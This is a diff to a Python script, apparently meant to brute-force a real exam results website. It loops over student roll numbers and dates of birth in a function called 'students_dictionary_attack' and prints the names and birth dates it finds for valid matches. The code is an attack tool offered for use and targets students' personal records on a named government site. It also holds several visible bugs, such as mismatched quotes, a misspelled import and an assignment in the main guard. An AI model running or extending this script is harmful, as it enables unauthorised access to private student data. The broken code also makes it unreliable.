@@ -3,7 +3,7 @@ from bs4 import BeautifulSoup
 from datetime import datatime,timedelta
 
 def process_package(package):
-    size = str(len(package.content)/1008)[0:4]
+    size = str(len(package.content)/1008)[0:4] + 'kb'
     status = package.status_code
     content = BeautifulSoup(package.text, 'html.parser').find('div',{'data-role' : 'content'}).text
     name = str( ' ' + content.splitlines()[6] +') ')
@@ -14,7 +14,19 @@ def process_package(package):
         return { 'valid': True, 'content': content, 'size': size, 'status': status, 'name': name}
 
 def result_screen(Details : dict):
-    pass
+    
+    if Details['valid']:    validation = 'valid'
+    else:   validation = 'invalid'
+    
+    print(f'-----' *100)
+    print(f'[req] :  {Details['id']} | {Details['date_of_brith]}  ({Details['number_of_id']}/{Details['number_of_dates]}) @!{Details['status']}  ^ ({Details['size']}kb)')
+    print(f'     ')
+    print(f'>>> Name          : ', Details['name'])
+    print(f'>>> Student       : ', Details['id'])
+    print(f'>>> DOB           : ', Details['date_of_brith'])
+    print(f'>>> validation    : ', validation)
+    print(f'>>> Total_count   : ', Details['total_count'])
+    print(f'-----' *100)
 
 def connection_send_package(roll_no, date_of_brith):
     url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
@@ -58,7 +70,10 @@ def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_bri
             package = connection_send_package( studentID, date_of_brith)
             result = process_package(package)
             
-            result_screen( (total_number_of_Id) )
+            Details = result.copy().update({'id': studentID, 'date_of_brith':date_of_brith, 'total_count': total_count_of_squence_over_student, 'number_of_dates':number_of_dates, 'number_of_id': total_number_of_Id})
+            result_screen(Details)
+            
+            if Details['valid']:    break
             
 
 if __name__ = '__main__':
